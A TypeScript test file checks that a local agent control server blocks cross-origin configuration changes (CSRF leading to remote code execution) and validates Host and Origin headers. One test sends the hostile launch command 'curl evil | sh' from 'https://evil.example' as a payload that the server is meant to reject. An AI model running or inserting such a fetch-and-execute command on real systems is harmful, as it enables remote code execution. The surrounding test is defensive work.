import { describe, expect, test } from 'bun:test';
import { ProcessManager } from '../agent/manager';
import { createFetchHandler } from '../agent/server';

const ALLOWED = ['http://localhost:5273'];

function put(
  url: string,
  body: unknown,
  origin: string | null,
  headers: Record<string, string> = {}
) {
  return new Request(url, {
    method: 'PUT',
    headers: {
      'Content-Type': 'application/json',
      ...(origin ? { Origin: origin } : {}),
      ...headers,
    },
    body: JSON.stringify(body),
  });
}

describe('agent CSRF-to-RCE protection', () => {
  test('cross-origin config PUT is rejected 403 and never mutates the launch command', async () => {
    const m = new ProcessManager();
    const before = m.getConfig().command;
    const handle = createFetchHandler(m, { allowedOrigins: ALLOWED });

    const res = await handle(
      put(
        'http://127.0.0.1:6800/control/config',
        { command: 'curl evil | sh' },
        'https://evil.example'
      )
    );

    expect(res.status).toBe(403);
    expect(res.headers.get('Access-Control-Allow-Origin')).toBeNull();
    // The RCE vector: the attacker-supplied command must NOT have been merged.
    expect(m.getConfig().command).toBe(before);
    expect(m.getConfig().command).not.toContain('evil');
  });

  test('same-origin (dashboard) config PUT succeeds and reflects the origin', async () => {
    const m = new ProcessManager();
    const handle = createFetchHandler(m, { allowedOrigins: ALLOWED });
    const res = await handle(
      put('http://127.0.0.1:6800/control/config', { httpPort: 7777 }, 'http://localhost:5273')
    );
    expect(res.status).toBe(200);
    expect(res.headers.get('Access-Control-Allow-Origin')).toBe('http://localhost:5273');
    expect(m.getConfig().httpPort).toBe(7777);
  });

  test('non-browser caller (no Origin) still works for local use', async () => {
    const m = new ProcessManager();
    const handle = createFetchHandler(m, { allowedOrigins: ALLOWED });
    const res = await handle(put('http://127.0.0.1:6800/control/config', { httpPort: 8123 }, null));
    expect(res.status).toBe(200);
    expect(m.getConfig().httpPort).toBe(8123);
  });

  test('OPTIONS preflight validates Host and Origin before returning 204', async () => {
    const m = new ProcessManager();
    const handle = createFetchHandler(m, {
      allowedOrigins: ALLOWED,
      allowedHosts: ['127.0.0.1'],
      token: 's3cret',
      requireTokenForAll: true,
    });
    const ok = await handle(
      new Request('http://127.0.0.1:6800/control/config', {
        method: 'OPTIONS',
        headers: { Host: '127.0.0.1:6800', Origin: 'http://localhost:5273' },
      })
    );
    expect(ok.status).toBe(204);
    expect(ok.headers.get('Access-Control-Allow-Origin')).toBe('http://localhost:5273');

    const badOrigin = await handle(
      new Request('http://127.0.0.1:6800/control/config', {
        method: 'OPTIONS',
        headers: { Host: '127.0.0.1:6800', Origin: 'https://evil.example' },
      })
    );
    expect(badOrigin.status).toBe(403);
    expect(badOrigin.headers.get('Access-Control-Allow-Origin')).toBeNull();

    const badHost = await handle(
      new Request('http://127.0.0.1:6800/control/config', {
        method: 'OPTIONS',
        headers: { Host: 'evil.example', Origin: 'http://localhost:5273' },
      })
    );
    expect(badHost.status).toBe(403);
    // Host is rejected, but the exact allowed Origin is still reflected so a
    // browser can read the JSON error; no ProcessManager route was reached.
    expect(badHost.headers.get('Access-Control-Allow-Origin')).toBe('http://localhost:5273');
  });
});
